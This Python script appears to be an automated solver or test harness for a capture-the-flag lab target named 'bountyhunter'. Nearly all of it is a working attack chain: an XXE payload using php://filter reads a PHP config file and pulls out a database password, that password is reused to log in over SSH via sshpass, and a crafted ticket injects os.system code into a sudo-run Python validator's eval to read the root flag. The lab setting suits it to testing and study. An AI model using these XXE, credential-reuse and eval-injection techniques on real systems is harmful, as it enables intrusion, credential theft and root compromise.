#!/usr/bin/env python3
"""Independent player for the real PHP XXE -> SSH -> sudo Skytrain eval chain."""
import base64
import os
import re
import subprocess
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://bountyhunter-target").rstrip("/")
EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]


def get(path):
    request = urllib.request.Request(BASE + path)
    with urllib.request.urlopen(request, timeout=10) as response:
        return response.status, response.read().decode("utf-8", "replace")


def submit_xml(xml):
    encoded = base64.b64encode(xml.encode("utf-8")).decode("ascii")
    data = urllib.parse.urlencode({"data": encoded}).encode()
    request = urllib.request.Request(BASE + "/tracker_diRbPr00f314.php", data=data)
    with urllib.request.urlopen(request, timeout=12) as response:
        return response.status, response.read().decode("utf-8", "replace")


def ssh(password, command, timeout=20):
    args = [
        "sshpass", "-p", password, "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-o", "ConnectTimeout=8",
        "development@bountyhunter-target",
        command,
    ]
    return subprocess.run(args, text=True, capture_output=True, timeout=timeout)


status, home = get("/")
assert status == 200 and "BOUNTY HUNTERS" in home
status, portal = get("/portal.php")
assert status == 200 and "Portal under development" in portal
status, form = get("/log_submit.php")
assert status == 200 and "Bounty Report System - Beta" in form
assert "bountylog.js" in form
status, javascript = get("/resources/bountylog.js")
assert status == 200 and "tracker_diRbPr00f314.php" in javascript
print("PASS: public site -> portal -> beta report form -> XML tracker discovery", flush=True)

normal_xml = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    "<bugreport><title>Independent Test</title><cwe>CWE-611</cwe>"
    "<cvss>2</cvss><reward>100</reward></bugreport>"
)
status, normal = submit_xml(normal_xml)
assert status == 200 and "Independent Test" in normal
assert "If DB were ready, would have added:" in normal
print("PASS: ordinary report is parsed by genuine PHP SimpleXML", flush=True)

xxe_xml = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE bugreport [<!ENTITY cfg SYSTEM '
    '"php://filter/convert.base64-encode/resource=/var/www/localhost/htdocs/db.php">]>'
    "<bugreport><title>Configuration Review</title><cwe>CWE-611</cwe>"
    "<cvss>6.5</cvss><reward>&cfg;</reward></bugreport>"
)
status, xxe_response = submit_xml(xxe_xml)
assert status == 200, xxe_response[:600]
match = re.search(r"Reward:\s*([A-Za-z0-9+/=]+)", xxe_response)
assert match, "XXE response did not contain the PHP filter output"
config_source = base64.b64decode(match.group(1), validate=True).decode("utf-8", "replace")
password_match = re.search(r'dbpassword\s*=\s*"([^"]+)"', config_source)
assert password_match, "The XXE-read db.php source did not contain the expected credential field"
password = password_match.group(1)
print("PASS: real PHP/libxml XXE + php://filter disclosed the beta config credential", flush=True)

login = ssh(
    password,
    "id -un; id; cat /home/development/user.txt; "
    "if test -r /root/root.txt; then echo ROOT_READABLE; else echo ROOT_DENIED; fi",
)
assert login.returncode == 0, (login.stdout, login.stderr)
assert "development" in login.stdout and "uid=1000(development)" in login.stdout, login.stdout
assert EXPECTED_USER_FLAG in login.stdout, "Exact per-instance User Flag not recovered over SSH"
assert "ROOT_DENIED" in login.stdout and "ROOT_READABLE" not in login.stdout, login.stdout
print("PASS: XXE credential reuse -> real SSH development foothold -> exact User Flag", flush=True)

sudo = ssh(password, "sudo -n -l")
assert sudo.returncode == 0 and "/opt/skytrain_inc/ticketValidator.py" in sudo.stdout, (sudo.stdout, sudo.stderr)
print("PASS: actual sudoers rule exposes only the Skytrain ticket validator", flush=True)

ticket_lines = [
    "# Skytrain Inc",
    "## Ticket to QA",
    "__Ticket Code:__",
    '**32+__import__("os").system("id > /tmp/bountyhunter-root-proof; '
    'cat /root/root.txt > /tmp/bountyhunter-root-flag-proof; '
    'chmod 0644 /tmp/bountyhunter-root-proof /tmp/bountyhunter-root-flag-proof")+1000**',
]
ticket = "\n".join(ticket_lines) + "\n"
encoded_ticket = base64.b64encode(ticket.encode("utf-8")).decode("ascii")
remote = (
    "printf '%s' '" + encoded_ticket + "' | base64 -d > /tmp/skytrain-ci.md && "
    "printf '/tmp/skytrain-ci.md\\n' | "
    "sudo -n /usr/bin/python3 /opt/skytrain_inc/ticketValidator.py"
)
validation = ssh(password, remote, timeout=25)
assert validation.returncode == 0 and "Valid ticket." in validation.stdout, (
    validation.stdout, validation.stderr
)
proof = ssh(password, "cat /tmp/bountyhunter-root-proof; cat /tmp/bountyhunter-root-flag-proof")
assert proof.returncode == 0 and "uid=0(root)" in proof.stdout, proof.stdout
assert EXPECTED_ROOT_FLAG in proof.stdout, "Exact per-instance Root Flag not recovered through sudo eval"
print("PASS: genuine Python eval in sudo validator -> UID 0 -> exact Root Flag", flush=True)
